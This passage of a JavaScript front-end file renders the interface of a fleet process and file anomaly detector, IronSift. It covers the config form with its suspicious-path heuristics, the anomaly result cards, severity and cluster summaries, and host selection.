    const empty = sources.filter((s) => !Number(s.process_rows || 0) && !Number(s.file_rows || 0));
    return `<details class="ml-details ml-debug-panel" ${dbg.open ? "open" : ""}>
      <summary>Run debug <span class="muted">· inventory · sources · request</span></summary>
      <div class="ml-debug-grid">
        <div><dt>Run id</dt><dd class="mono">${esc(last.run_id || "—")}</dd></div>
        <div><dt>Mode</dt><dd class="mono">${esc(last.mode || dbg.mode || "—")}</dd></div>
        <div><dt>Inventory scan #</dt><dd class="mono">${esc(String(dbg.inventory ?? last.inventory ?? "1"))}</dd></div>
        <div><dt>Config</dt><dd>${esc(last.detection_config_name || dbg.config_name || "inline")}</dd></div>
        <div><dt>Hosts in request</dt><dd class="mono">${esc(String(dbg.host_count ?? sources.length ?? "—"))}</dd></div>
        <div><dt>Sources returned</dt><dd class="mono">${esc(String(sources.length))}</dd></div>
        <div><dt>Process rows</dt><dd class="mono">${esc(String(procRows))}</dd></div>
        <div><dt>File rows</dt><dd class="mono">${esc(String(fileRows))}</dd></div>
        <div><dt>Elapsed</dt><dd class="mono">${esc(dbg.elapsed_ms != null ? `${dbg.elapsed_ms} ms` : "—")}</dd></div>
        <div><dt>Filters</dt><dd class="mono">${esc(dbg.filters || "—")}</dd></div>
      </div>
      ${empty.length ? `<p class="muted" style="font-size:0.8rem;margin:0.45rem 0 0">⚠ ${empty.length} source host(s) had no process/file rows for this inventory.</p>` : ""}
      ${sources.length ? `
      <div class="ml-table-scroll" style="margin-top:0.55rem;max-height:180px">
        <table class="data"><thead><tr>
          <th>Host</th><th>Kind</th><th>Process</th><th>File</th><th>Source</th>
        </tr></thead><tbody>
          ${sources.map((s) => `<tr>
            <td><strong>${esc(s.display_name || s.host_id)}</strong></td>
            <td class="mono">${esc(s.agent_kind || "—")}</td>
            <td class="mono">${esc(String(s.process_rows ?? 0))}</td>
            <td class="mono">${esc(String(s.file_rows ?? 0))}</td>
            <td class="muted">${esc(s.source || "—")}</td>
          </tr>`).join("")}
        </tbody></table>
      </div>` : ""}
    </details>`;
  }

  function anomarkModelDetailHtml(model, inspect, trainResult) {
    const m = model || {};
    const req = m.request || trainResult?.record?.request || {};
    const rec = trainResult?.record || m;
    const insp = inspect || null;
    return `<section class="panel ml-card ml-model-detail">
      <div class="panel-head">
        <h3>${esc(m.name || rec.name || "Model detail")}</h3>
        <span class="mono muted">${esc(shortId(m.id || rec.id || trainResult?.train_id || ""))}</span>
      </div>
      <div class="ml-panel-body">
        <div class="ml-debug-grid">
          <div><dt>Lines trained</dt><dd class="mono">${esc(String(rec.training_line_count ?? m.training_line_count ?? "—"))}</dd></div>
          <div><dt>Order</dt><dd class="mono">${esc(String(insp?.order ?? req.order ?? "—"))}</dd></div>
          <div><dt>Column</dt><dd class="mono">${esc(req.column || "cmdline")}</dd></div>
          <div><dt>Created</dt><dd class="mono">${esc(fmtWhen(rec.created_at || m.created_at))}</dd></div>
          <div><dt>Status</dt><dd>${esc(trainResult?.status || (m.available === false ? "missing file" : "ready"))}</dd></div>
          <div><dt>Favorite</dt><dd>${m.favorite || rec.favorite ? "yes" : "no"}</dd></div>
          ${insp ? `
          <div><dt>Contexts</dt><dd class="mono">${esc(String(insp.num_contexts ?? "—"))}</dd></div>
          <div><dt>Transitions</dt><dd class="mono">${esc(String(insp.num_transitions ?? "—"))}</dd></div>
          <div><dt>Alphabet</dt><dd class="mono">${esc(String(insp.alphabet_len ?? "—"))}</dd></div>
          <div><dt>Prior (ln)</dt><dd class="mono">${esc(insp.prior != null ? Number(insp.prior).toFixed(4) : "—")}</dd></div>
          <div><dt>Suspect thresh (ln)</dt><dd class="mono">${esc(insp.suspect_threshold_ln != null ? Number(insp.suspect_threshold_ln).toFixed(4) : "—")}</dd></div>
          <div><dt>Model size</dt><dd class="mono">${esc(insp.file_size_bytes != null ? `${Math.round(insp.file_size_bytes / 1024)} KB` : "—")}</dd></div>
          ` : ""}
        </div>
        ${insp?.where_generated ? `
          <p class="muted" style="font-size:0.8rem;margin:0.55rem 0 0">
            Generated ${esc(fmtWhen(insp.where_generated.generated_at))} ·
            ${esc(insp.where_generated.source_label || "")} ·
            ${esc(String(insp.where_generated.training_line_count ?? ""))} lines
          </p>` : ""}
        ${trainResult?._debug?.length ? `
          <ul class="ml-debug-log" style="margin-top:0.55rem">
            ${trainResult._debug.map((d) => `<li><span class="mono muted">${esc(d.ts || "")}</span> ${esc(d.msg || "")}</li>`).join("")}
          </ul>` : ""}
        <div class="toolbar" style="margin-top:0.55rem">
          <button type="button" class="btn ghost tiny" data-anomark-inspect="${esc(m.id || rec.id || trainResult?.train_id || "")}">Inspect model</button>
        </div>
      </div>
    </section>`;
  }

  function siftConfigDefaults() {
    return {
      entropy_threshold: 4.5,
      minority_cluster_ratio: 0.1,
      dbscan_tolerance: 0.35,
      dbscan_min_samples: 2,
      normalize_features: true,
      exclude_kernel_threads: true,
      flag_unexpected_root: true,
      exclude_init_children: false,
      quiet: true,
      file_rare_requires_risk: true,
      file_max_rare_examples_per_host: 20,
      file_max_unique_features: 8000,
      file_fleet_baseline_fingerprint_enabled: false,
      file_fleet_baseline_min_host_fraction: 1.0,
      suspicious_path_patterns: [
        "/tmp/", "/dev/shm/", "/var/tmp/", "/home/[^/]+/\\.[^/]+", "^\\./",
        "/(?:bin|sbin|usr/bin|usr/sbin)/\\.[^/]+",
      ],
      common_root_processes: [
        "systemd", "init", "sshd", "cron", "crond", "rsyslogd", "dockerd", "containerd", "kubelet",
      ],
      whitelisted_path_patterns: [],
      file_excluded_path_regexes: [],
      file_excluded_filename_regexes: [],
    };
  }

  function ensureSiftConfigState() {
    if (!state._siftConfig) state._siftConfig = siftConfigDefaults();
    if (state._siftConfigRaw == null) {
      try {
        state._siftConfigRaw = JSON.stringify(state._siftConfig, null, 2);
      } catch (_) {
        state._siftConfigRaw = "{}";
      }
    }
  }

  function readSiftConfigFromForm() {
    ensureSiftConfigState();
    const base = { ...(state._siftConfig || siftConfigDefaults()) };
    const num = (id, fallback) => {
      const el = document.getElementById(id);
      if (!el) return fallback;
      const n = Number(el.value);
      return Number.isFinite(n) ? n : fallback;
    };
    const bool = (id, fallback) => {
      const el = document.getElementById(id);
      return el ? !!el.checked : fallback;
    };
    const lines = (id) => {
      const el = document.getElementById(id);
      if (!el) return undefined;
      return String(el.value || "").split("\n").map((s) => s.trim()).filter(Boolean);
    };
    base.entropy_threshold = num("siftCfgEntropy", base.entropy_threshold);
    base.minority_cluster_ratio = num("siftCfgMinority", base.minority_cluster_ratio);
    base.dbscan_tolerance = num("siftCfgEps", base.dbscan_tolerance);
    base.dbscan_min_samples = Math.max(1, Math.floor(num("siftCfgMinSamples", base.dbscan_min_samples)));
    base.normalize_features = bool("siftCfgNormalize", !!base.normalize_features);
    base.exclude_kernel_threads = bool("siftCfgExKernel", !!base.exclude_kernel_threads);
    base.flag_unexpected_root = bool("siftCfgFlagRoot", !!base.flag_unexpected_root);
    base.exclude_init_children = bool("siftCfgExInit", !!base.exclude_init_children);
    base.file_rare_requires_risk = bool("siftCfgRareRisk", !!base.file_rare_requires_risk);
    base.file_fleet_baseline_fingerprint_enabled = bool("siftCfgBaseline", !!base.file_fleet_baseline_fingerprint_enabled);
    const sus = lines("siftCfgSuspicious");
    if (sus) base.suspicious_path_patterns = sus;
    const roots = lines("siftCfgRootProcs");
    if (roots) base.common_root_processes = roots;
    const wl = lines("siftCfgWhitelist");
    if (wl) base.whitelisted_path_patterns = wl;
    const rawEl = $("#siftCfgRaw");
    if (rawEl) {
      try {
        const parsed = JSON.parse(rawEl.value || "{}");
        Object.assign(base, parsed);
        state._siftConfigRaw = rawEl.value;
      } catch (_) {
        /* keep form fields */
      }
    }
    state._siftConfig = base;
    return base;
  }

  function siftSeverityRank(sev) {
    const s = String(sev || "").toLowerCase();
    if (s === "critical") return 4;
    if (s === "high") return 3;
    if (s === "medium") return 2;
    if (s === "low") return 1;
    return 0;
  }

  function siftScoreBar(score) {
    const n = Number(score);
    if (!Number.isFinite(n)) return `<span class="muted">—</span>`;
    const pct = Math.max(4, Math.min(100, Math.round(n * 100)));
    const tone = n >= 1 ? "crit" : n >= 0.6 ? "high" : n >= 0.3 ? "med" : "low";
    return `<div class="sift-score" title="${esc(n.toFixed(3))}">
      <div class="sift-score-track"><span class="sift-score-fill sift-score-fill--${tone}" style="width:${pct}%"></span></div>
      <span class="mono sift-score-num">${esc(n.toFixed(2))}</span>
    </div>`;
  }

  function siftRiskTags(factors) {
    const list = (factors || []).filter(Boolean);
    if (!list.length) return `<span class="muted">—</span>`;
    const shown = list.slice(0, 8);
    const more = list.length - shown.length;
    return `<div class="sift-risk-tags">
      ${shown.map((f) => `<span class="sift-risk-tag" title="${esc(f)}">${esc(f)}</span>`).join("")}
      ${more > 0 ? `<span class="sift-risk-tag sift-risk-tag--more">+${more}</span>` : ""}
    </div>`;
  }

  /** Parse IronSift "RISK DETECTED: name=… path=…" lines into structured rows. */
  function siftParseRiskFactor(raw) {
    const s = String(raw || "");
    const m = s.match(/^RISK DETECTED:\s*(.*)$/i);
    if (m) {
      const fields = {};
      for (const part of m[1].split(/\s+/)) {
        const eq = part.indexOf("=");
        if (eq > 0) fields[part.slice(0, eq)] = part.slice(eq + 1);
      }
      return {
        kind: "risk",
        name: fields.name || "—",
        path: fields.path || "—",
        parent: fields.parent || "—",
        uid: fields.uid || "—",
        count: fields.count || "—",
        reasons: (fields.reasons || "").split(",").filter(Boolean),
        raw: s,
      };
    }
    if (/^Rare (process|file)/i.test(s)) {
      return { kind: "rare", text: s, raw: s };
    }
    return { kind: "note", text: s, raw: s };
  }

  function showSiftAnomalyDetail(a, hostLabel, sources) {
    if (!a) return;
    const mid = a.machine_id || "—";
    const kind = a._kind || "process";
    const factors = (a.risk_factors || []).map(siftParseRiskFactor);
    const risks = factors.filter((f) => f.kind === "risk");
    const notes = factors.filter((f) => f.kind !== "risk");
    const src = (sources || []).find((s) => s.host_id === mid || s.display_name === mid);
    const hostRec = state.hostById?.[mid] || state.hosts?.find((h) => h.id === mid || h.display_name === mid);
    const hostId = hostRec?.id || src?.host_id || "";
    const cluster = a.cluster_assignment == null ? "outlier" : `cluster ${a.cluster_assignment}`;
    openDrawer(`${hostLabel || mid}`, `
      <div class="sift-detail-head">
        <div class="sift-detail-title-row">
          ${sev(String(a.severity || "medium").toLowerCase())}
          <span class="pill neutral">${esc(kind)}</span>
          <span class="muted mono">${esc(cluster)}</span>
        </div>
        <div class="muted" style="font-size:0.82rem;margin-top:0.35rem">
          Host <strong title="${esc(mid)}">${esc(hostLabel || mid)}</strong>
          ${src?.last_scan_at ? ` · last scan ${esc(fmtWhen(src.last_scan_at))}` : ""}
        </div>
      </div>
      <dl class="kv">
        <dt>Anomaly score</dt><dd>${siftScoreBar(a.anomaly_score)}</dd>
        <dt>Inventory</dt><dd class="mono">${esc(String(a.process_count ?? "—"))} ${kind === "file" ? "files" : "processes"}
          · ${esc(String(a.suspicious_process_count ?? 0))} flagged</dd>
        <dt>Source rows</dt><dd class="mono">${esc(String(src?.process_rows ?? "—"))} proc · ${esc(String(src?.file_rows ?? "—"))} file</dd>
      </dl>
      ${risks.length ? `
        <h4 class="sift-detail-h">Suspicious ${kind === "file" ? "files" : "processes"} (${risks.length})</h4>
        <div class="ml-table-scroll">
          <table class="data"><thead><tr>
            <th>Name</th><th>Path</th><th>Parent</th><th>UID</th><th>Count</th><th>Reasons</th>
          </tr></thead><tbody>
            ${risks.map((r) => `<tr>
              <td class="mono">${esc(r.name)}</td>
              <td class="mono" title="${esc(r.path)}">${esc(String(r.path).length > 48 ? String(r.path).slice(0, 48) + "…" : r.path)}</td>
              <td class="mono">${esc(r.parent)}</td>
              <td class="mono">${esc(r.uid)}</td>
              <td class="mono">${esc(r.count)}</td>
              <td>${(r.reasons || []).map((x) => `<span class="tag">${esc(x)}</span>`).join(" ") || "—"}</td>
            </tr>`).join("")}
          </tbody></table>
        </div>` : ""}
      ${notes.length ? `
        <h4 class="sift-detail-h">Other signals (${notes.length})</h4>
        <ul class="sift-detail-notes">
          ${notes.map((n) => `<li>${esc(n.text || n.raw)}</li>`).join("")}
        </ul>` : (!risks.length ? `<div class="empty">No risk factor details for this anomaly.</div>` : "")}
      <div class="form-actions" style="justify-content:flex-start;margin-top:1rem">
        ${hostId ? `<button type="button" class="btn primary" data-sift-open-host="${esc(hostId)}">Open host</button>` : ""}
        <button type="button" class="btn ghost" data-close-drawer>Close</button>
      </div>
      <details class="ml-details">
        <summary>Raw anomaly JSON</summary>
        <pre class="mono ml-score-pre">${esc(JSON.stringify(a, null, 2))}</pre>
      </details>
    `);
    $$("[data-sift-open-host]", $("#drawerBody")).forEach((btn) => {
      btn.addEventListener("click", () => {
        const id = btn.getAttribute("data-sift-open-host");
        closeDrawer();
        if (id) showHostDetail(id).catch((err) => toast(err.message));
      });
    });
    $$("[data-close-drawer]", $("#drawerBody")).forEach((btn) => {
      btn.addEventListener("click", () => closeDrawer());
    });
  }

  function siftSeveritySummary(rows) {
    const counts = { critical: 0, high: 0, medium: 0, low: 0 };
    for (const a of rows) {
      const k = String(a.severity || "medium").toLowerCase();
      if (counts[k] != null) counts[k] += 1;
      else counts.medium += 1;
    }
    const total = rows.length || 1;
    return `<div class="sift-sev-summary">
      ${["critical", "high", "medium", "low"].map((k) => {
        const n = counts[k];
        const pct = Math.round((n / total) * 100);
        return `<div class="sift-sev-chip sift-sev-chip--${k}" title="${esc(k)}: ${n}">
          <span class="sift-sev-chip-count">${n}</span>
          <span class="sift-sev-chip-label">${esc(k)}</span>
          <span class="sift-sev-chip-bar"><i style="width:${n ? Math.max(8, pct) : 0}%"></i></span>
        </div>`;
      }).join("")}
    </div>`;
  }

  function siftClusterStrip(report) {
    const dist = report?.cluster_distribution || {};
    const entries = Object.entries(dist)
      .map(([k, v]) => [k, Number(v) || 0])
      .filter(([, v]) => v > 0)
      .sort((a, b) => b[1] - a[1]);
    if (!entries.length) return "";
    const max = Math.max(...entries.map(([, v]) => v), 1);
    return `<div class="sift-cluster-strip">
      <div class="muted sift-cluster-label">Clusters</div>
      <div class="sift-cluster-bars">
        ${entries.slice(0, 12).map(([k, v]) => {
          const label = k === "outliers" ? "outliers" : k.replace(/^cluster_/, "c");
          const h = Math.max(10, Math.round((v / max) * 100));
          return `<div class="sift-cluster-bar" title="${esc(k)}: ${v}">
            <span style="height:${h}%"></span>
            <em>${esc(String(v))}</em>
            <small>${esc(label)}</small>
          </div>`;
        }).join("")}
      </div>
    </div>`;
  }

  function siftResultsBody(last, mode) {
    if (!last) {
      return `<div class="empty ml-empty-hero">No run yet — set a detection profile, scope hosts, then <strong>Run on fleet</strong> (≥2 hosts with data).</div>`;
    }
    const anomalies = last?.report?.anomalies || [];
    const fileAnoms = last?.file_report?.anomalies || [];
    const sources = last?.sources || [];
    const all = [
      ...anomalies.map((a) => ({ ...a, _kind: "process" })),
      ...fileAnoms.map((a) => ({ ...a, _kind: "file" })),
    ];
    const anomalyCount = Number(last.anomalies ?? all.length);
    const resultTab = state._siftResultTab
      || (anomalies.length && !fileAnoms.length ? "process"
        : !anomalies.length && fileAnoms.length ? "file"
          : "all");
    const shown = resultTab === "process" ? anomalies.map((a) => ({ ...a, _kind: "process" }))
      : resultTab === "file" ? fileAnoms.map((a) => ({ ...a, _kind: "file" }))
        : all;
    const q = String(state._siftResultQ || "").trim().toLowerCase();
    const sevFilter = String(state._siftResultSev || "").toLowerCase();
    const filtered = shown.filter((a) => {
      if (sevFilter && String(a.severity || "").toLowerCase() !== sevFilter) return false;
      if (!q) return true;
      const hay = [
        a.machine_id,
        a.severity,
        ...(a.risk_factors || []),
        a._kind,
        sources.find((s) => s.host_id === a.machine_id)?.display_name,
        state.hostById?.[a.machine_id]?.display_name,
      ].filter(Boolean).join(" ").toLowerCase();
      return hay.includes(q);
    });

    return `
      <div class="stats ml-kpi-row">
        <div class="stat"><div class="label">When</div><div class="value" style="font-size:0.88rem">${esc(fmtWhen(last.created_at || last.modified_unix))}</div></div>
        <div class="stat"><div class="label">Machines</div><div class="value">${esc(String(last.machines ?? last.report?.total_analyzed ?? "—"))}</div></div>
        <div class="stat crit"><div class="label">Anomalies</div><div class="value">${esc(String(anomalyCount))}</div></div>
        <div class="stat"><div class="label">Mode</div><div class="value">${esc(last.mode || mode)}</div></div>
        <div class="stat"><div class="label">Config</div><div class="value" style="font-size:0.88rem">${esc(last.detection_config_name || "default")}</div></div>
      </div>
      ${siftRunDebugHtml(last)}
      ${all.length ? siftSeveritySummary(all) : ""}
      ${siftClusterStrip(last.report) || siftClusterStrip(last.file_report) || ""}
      ${!all.length ? `<div class="empty sift-results-empty">No anomalies in this run — fleet looks consistent.</div>` : `
      <div class="sift-results-toolbar">
        <div class="sift-results-tabs" role="tablist">
          <button type="button" class="sift-tab ${resultTab === "all" ? "is-active" : ""}" data-sift-result-tab="all">All (${all.length})</button>
          <button type="button" class="sift-tab ${resultTab === "process" ? "is-active" : ""}" data-sift-result-tab="process" ${anomalies.length ? "" : "disabled"}>Process (${anomalies.length})</button>
          <button type="button" class="sift-tab ${resultTab === "file" ? "is-active" : ""}" data-sift-result-tab="file" ${fileAnoms.length ? "" : "disabled"}>File (${fileAnoms.length})</button>
        </div>
        <div class="sift-results-filters">
          <input id="siftResultQ" type="search" placeholder="Filter host or reason…" value="${esc(state._siftResultQ || "")}" />
          <select id="siftResultSev">
            <option value="">All severities</option>
            ${["critical", "high", "medium", "low"].map((s) =>
              `<option value="${s}" ${sevFilter === s ? "selected" : ""}>${s}</option>`
            ).join("")}
          </select>
        </div>
      </div>
      <div class="muted" style="font-size:0.78rem;margin:0.35rem 0 0.55rem">
        Showing ${filtered.length} of ${shown.length}
      </div>
      ${!filtered.length
        ? `<div class="empty">No anomalies match these filters</div>`
        : (() => {
            const ranked = filtered.slice().sort((a, b) => {
              const sr = siftSeverityRank(b.severity) - siftSeverityRank(a.severity);
              if (sr) return sr;
              return Number(b.anomaly_score || 0) - Number(a.anomaly_score || 0);
            });
            state._siftResultRows = ranked;
            state._siftResultSources = sources;
            return `<div class="sift-anom-list">
            ${ranked.map((a, idx) => {
              const mid = a.machine_id || "—";
              const hostLabel = (() => {
                const src = sources.find((s) => s.host_id === mid || s.display_name === mid);
                if (src?.display_name) return src.display_name;
                const fromState = state.hostById?.[mid]?.display_name;
                return fromState || mid;
              })();
              const kind = a._kind || "process";
              const cluster = a.cluster_assignment == null ? "outlier" : `cluster ${a.cluster_assignment}`;
              const procs = a.process_count != null
                ? `${a.suspicious_process_count ?? 0}/${a.process_count} suspicious procs`
                : "";
              return `<article class="sift-anom-card sift-anom-card--${esc(String(a.severity || "medium").toLowerCase())}" data-sift-anom="${esc(String(idx))}" role="button" tabindex="0" title="View anomaly details">
                <div class="sift-anom-head">
                  <div class="sift-anom-title">
                    ${sev(String(a.severity || "medium").toLowerCase())}
                    <strong class="sift-anom-host" title="${esc(mid)}">${esc(hostLabel)}</strong>
                    <span class="pill neutral">${esc(kind)}</span>
                  </div>
                  ${siftScoreBar(a.anomaly_score)}
                </div>
                <div class="sift-anom-meta muted">
                  <span>${esc(cluster)}</span>
                  ${procs ? `<span>· ${esc(procs)}</span>` : ""}
                  <span class="mono">#${idx + 1}</span>
                  <span class="sift-anom-open">Details →</span>
                </div>
                ${siftRiskTags(a.risk_factors)}
              </article>`;
            }).join("")}
          </div>`;
          })()}`}
      ${sources.length ? `
      <details class="ml-details">
        <summary>Sources used (${sources.length})</summary>
        <div class="ml-table-scroll">
          <table class="data"><thead><tr>
            <th>Host</th><th>Kind</th><th>Last scan</th><th>Process</th><th>File</th><th>Source</th>
          </tr></thead><tbody>
            ${sources.map((s) => `<tr>
              <td><strong>${esc(s.display_name || s.host_id)}</strong></td>
              <td class="mono">${esc(s.agent_kind || "—")}</td>
              <td class="mono muted">${esc(fmtWhen(s.last_scan_at))}</td>
              <td class="mono">${esc(String(s.process_rows ?? 0))}</td>
              <td class="mono">${esc(String(s.file_rows ?? 0))}</td>
              <td class="muted">${esc(s.source || "—")}</td>
            </tr>`).join("")}
          </tbody></table>
        </div>
      </details>` : ""}`;
  }

  function mlSubTabsHtml(tabs, active, attr) {
    const a = attr || "data-ml-tab";
    return `<div class="ml-subtabs host-detail-tabs" role="tablist">
      ${tabs.map(([id, label, badge]) => {
        const on = id === active;
        const badgeHtml = badge != null && badge !== ""
          ? ` <span class="ml-subtab-badge">${esc(String(badge))}</span>`
          : "";
        return `<button type="button" class="tab ${on ? "active" : ""}" ${a}="${esc(id)}" role="tab" aria-selected="${on}">${esc(label)}${badgeHtml}</button>`;
      }).join("")}
    </div>`;
  }

  function wireMlSubTabs(attr, stateKey, allowed) {
    const a = attr || "data-ml-tab";
    $$(`[${a}]`).forEach((btn) => {
      btn.addEventListener("click", () => {
        const id = btn.getAttribute(a) || "";
        if (allowed && !allowed.includes(id)) return;
        state[stateKey] = id;
        render();
      });
    });
  }

  function fleetSift() {
    ensureSiftConfigState();
    if (state._siftTag) {
      const t = String(state._siftTag).trim();
      if (t && !String(state._siftHostQ || "").includes(t)) {
        state._siftHostQ = `${String(state._siftHostQ || "").trim()} ${t}`.trim();
      }
      state._siftTag = "";
    }
    // Warm scan→host index once for the inventory column.
    siftScansByHost();
    const last = state._siftLast || null;
    const runs = state._siftRuns || [];
    const mode = state._siftMode || "process";
    const filtered = siftFilteredHosts();
    const selected = siftSelectedHostIds();
    const profiles = state._siftProfiles || [];
    const selectedCfgId = state._siftSelectedConfigId || "";
    const cfg = state._siftConfig || siftConfigDefaults();
    const envs = [...new Set((state.hosts || []).map((h) => h.labels?.env).filter(Boolean))].sort();
    const tags = siftKnownTags();
    const selectedVisible = filtered.filter((h) => selected.has(h.id)).length;
    const allVisibleSelected = filtered.length > 0 && filtered.every((h) => selected.has(h.id));
    const running = !!state._siftProgress;
    const activeRunId = last?.run_id || "";

    const configPanel = `
      <section class="panel ml-card">
        <div class="panel-head">
          <h3>Detection config</h3>
          <span class="muted">${esc((profiles.find((p) => p.id === selectedCfgId)?.name) || "default")} · IronSift</span>
        </div>
        <div class="ml-panel-body">
          <div class="toolbar ml-toolbar-wrap" style="margin-bottom:0.65rem">
            <select id="siftProfileSelect" class="ml-select" title="Saved profile">
              <option value="">Default / unsaved</option>
              ${profiles.map((p) => `<option value="${esc(p.id)}" ${selectedCfgId === p.id ? "selected" : ""}>${esc(p.name)}${p.is_selected ? " ★" : ""}</option>`).join("")}
            </select>
            <button type="button" class="btn ghost" id="siftCfgUseProfile">Use</button>
            <button type="button" class="btn ghost" id="siftCfgSaveActive">Save</button>
            <button type="button" class="btn ghost" id="siftCfgSaveAs">Save as…</button>
            <button type="button" class="btn ghost" id="siftCfgDelete" ${selectedCfgId ? "" : "disabled"}>Delete</button>
            <button type="button" class="btn ghost" id="siftCfgReset">Defaults</button>
          </div>
          <div class="sift-config-fields">
            <label>Entropy<input id="siftCfgEntropy" type="number" step="0.1" value="${esc(String(cfg.entropy_threshold ?? 4.5))}" /></label>
            <label>Minority ratio<input id="siftCfgMinority" type="number" step="0.01" min="0" max="1" value="${esc(String(cfg.minority_cluster_ratio ?? 0.1))}" /></label>
            <label>DBSCAN ε<input id="siftCfgEps" type="number" step="0.01" value="${esc(String(cfg.dbscan_tolerance ?? 0.35))}" /></label>
            <label>Min samples<input id="siftCfgMinSamples" type="number" min="1" step="1" value="${esc(String(cfg.dbscan_min_samples ?? 2))}" /></label>
            <label class="sift-check"><input id="siftCfgNormalize" type="checkbox" ${cfg.normalize_features !== false ? "checked" : ""} /> Normalize</label>
            <label class="sift-check"><input id="siftCfgExKernel" type="checkbox" ${cfg.exclude_kernel_threads !== false ? "checked" : ""} /> Skip kernel threads</label>
            <label class="sift-check"><input id="siftCfgFlagRoot" type="checkbox" ${cfg.flag_unexpected_root !== false ? "checked" : ""} /> Flag unexpected root</label>
            <label class="sift-check"><input id="siftCfgExInit" type="checkbox" ${cfg.exclude_init_children ? "checked" : ""} /> Skip init children</label>
            <label class="sift-check"><input id="siftCfgRareRisk" type="checkbox" ${cfg.file_rare_requires_risk !== false ? "checked" : ""} /> Rare needs risk</label>
            <label class="sift-check"><input id="siftCfgBaseline" type="checkbox" ${cfg.file_fleet_baseline_fingerprint_enabled ? "checked" : ""} /> Fleet baseline</label>
          </div>
          <details class="ml-details" id="siftCfgAdvanced">
            <summary>Advanced paths &amp; raw JSON</summary>
            <div class="sift-config-lists">
              <label>Suspicious path patterns
                <textarea id="siftCfgSuspicious" rows="4" class="mono">${esc((cfg.suspicious_path_patterns || []).join("\n"))}</textarea>
              </label>
              <label>Common root processes
                <textarea id="siftCfgRootProcs" rows="4" class="mono">${esc((cfg.common_root_processes || []).join("\n"))}</textarea>
              </label>
              <label>Whitelisted path patterns
                <textarea id="siftCfgWhitelist" rows="4" class="mono">${esc((cfg.whitelisted_path_patterns || []).join("\n"))}</textarea>
              </label>
            </div>
            <label class="ml-block-label">Raw JSON
              <textarea id="siftCfgRaw" rows="10" class="mono">${esc(state._siftConfigRaw || "")}</textarea>
            </label>
            <div class="toolbar" style="margin-top:0.45rem">
              <button type="button" class="btn ghost" id="siftCfgApplyRaw">Apply JSON → form</button>
            </div>
          </details>
        </div>
      </section>`;

    const resultsBody = siftResultsBody(last, mode);
    const tab = ["run", "config", "results"].includes(state._siftTab) ? state._siftTab : "run";
    state._siftTab = tab;
    const anomCount = last ? Number(last.anomalies ?? (last.findings || []).length ?? 0) : 0;

    const scopePanel = `
            <section class="panel ml-card">
              <div class="panel-head">
                <h3>Host scope <span class="muted">${selected.size ? `${selected.size} selected` : "all matching"} · ${filtered.length}</span></h3>
                <div class="toolbar">
                  <button type="button" class="btn ghost" id="siftSelectVisible">${allVisibleSelected ? "Clear visible" : "Select visible"}</button>
                  <button type="button" class="btn ghost" id="siftClearHosts">Clear</button>
                </div>
              </div>
              <div class="sift-scope-filters ml-panel-body">
                <label class="sift-filter-search">Search
                  <input id="siftHostQ" type="search" list="siftTagList" placeholder="Name, IP, or tag…" value="${esc(state._siftHostQ || "")}" autocomplete="off" />
                  <datalist id="siftTagList">${tags.map((t) => `<option value="${esc(t)}"></option>`).join("")}</datalist>
                </label>
                <label>Env
                  <select id="siftEnv">
                    <option value="">All envs</option>
                    ${envs.map((e) => `<option value="${esc(e)}" ${state._siftEnv === e ? "selected" : ""}>${esc(e)}</option>`).join("")}
                  </select>
                </label>
                <label>Kind
                  <select id="siftKind">
                    <option value="">All kinds</option>
                    <option value="ssh" ${state._siftKind === "ssh" ? "selected" : ""}>SSH</option>
                    <option value="agentlite" ${state._siftKind === "agentlite" ? "selected" : ""}>AgentLite</option>
                    <option value="virtual" ${state._siftKind === "virtual" ? "selected" : ""}>Virtual</option>
                  </select>
                </label>
                <label>Inventory scan #
                  <select id="siftInventory" class="ml-select" title="Nth newest finished scan per host (1 = latest; capped by scan history keep)">
                    ${(() => {
                      const keep = siftInventoryKeep();
                      const curN = siftInventoryIndex();
                      const opts = [];
                      for (let n = 1; n <= keep; n++) {
                        const label = n === 1
                          ? `1 — latest`
                          : n === 2
                            ? `2 — previous`
                            : `${n}`;
                        opts.push(`<option value="${n}" ${curN === n ? "selected" : ""}>${esc(label)}</option>`);
                      }
                      return opts.join("");
                    })()}
                  </select>
                </label>
                <details class="sift-date-fold">
                  <summary>Scan date range</summary>
                  <div class="sift-date-row">
                    <label>After<input id="siftScanAfter" type="datetime-local" value="${esc(state._siftScanAfter || "")}" /></label>
                    <label>Before<input id="siftScanBefore" type="datetime-local" value="${esc(state._siftScanBefore || "")}" /></label>
                  </div>
                </details>
              </div>
              <div class="sift-host-list ml-table-scroll">
                ${!filtered.length ? `<div class="empty">No hosts match these filters</div>` : `
                <table class="data"><thead><tr>
                  <th style="width:2rem"></th><th>Host</th><th>Kind</th><th>Tags</th><th>Scan #${esc(String(siftInventoryIndex()))}</th>
                </tr></thead><tbody>
                  ${filtered.map((h) => {
                    const checked = selected.has(h.id) ? "checked" : "";
                    const tagStr = fleetSiftHostTags(h).slice(0, 4).join(", ");
                    const finished = siftHostFinishedScans(h.id);
                    const invN = siftInventoryIndex();
                    const inv = finished[invN - 1] || null;
                    const avail = finished.length;
                    let cell;
                    if (inv) {
                      const setHint = inv.setLabel || "";
                      cell = `<span title="${esc(setHint)}${avail ? ` · ${avail} retained` : ""}">${esc(fmtWhen(inv.when))}</span>${setHint ? `<div class="muted" style="font-size:0.72rem">${esc(setHint)}</div>` : ""}`;
                    } else if (avail > 0) {
                      cell = `<span class="muted" title="Only ${avail} finished scan(s) retained">no #${esc(String(invN))} · ${avail} kept</span>`;
                    } else {
                      cell = `<span class="muted">—</span>`;
                    }
                    return `<tr>
                      <td><input type="checkbox" class="sift-host-cb" value="${esc(h.id)}" ${checked} /></td>
                      <td><strong>${esc(h.display_name || h.id)}</strong>
                        <div class="muted mono" style="font-size:0.75rem">${esc(h.primary_addr || "")}</div></td>
                      <td class="mono">${esc((h.agent_kind || "ssh").toLowerCase())}</td>
                      <td class="muted" style="font-size:0.8rem">${esc(tagStr || "—")}</td>
                      <td class="mono muted">${cell}</td>
                    </tr>`;
                  }).join("")}
                </tbody></table>`}
              </div>
              <div class="muted ml-foot-note">${selectedVisible} of ${filtered.length} visible checked · empty selection = all matching</div>
            </section>`;

    const resultsPanel = `
        <div class="ml-split ml-split--sift">
          <section class="panel ml-card">
            <div class="panel-head">
              <h3>Results ${last ? `<span class="muted">${esc(fmtWhen(last.created_at))} · ${esc(shortId(last.run_id || ""))}</span>` : ""}</h3>
              ${activeRunId ? `<button type="button" class="btn ghost tiny" data-sift-del="${esc(activeRunId)}">Delete this run</button>` : ""}
            </div>
            <div class="ml-panel-body">${resultsBody}</div>
          </section>

          <aside class="panel ml-card ml-runs-rail">
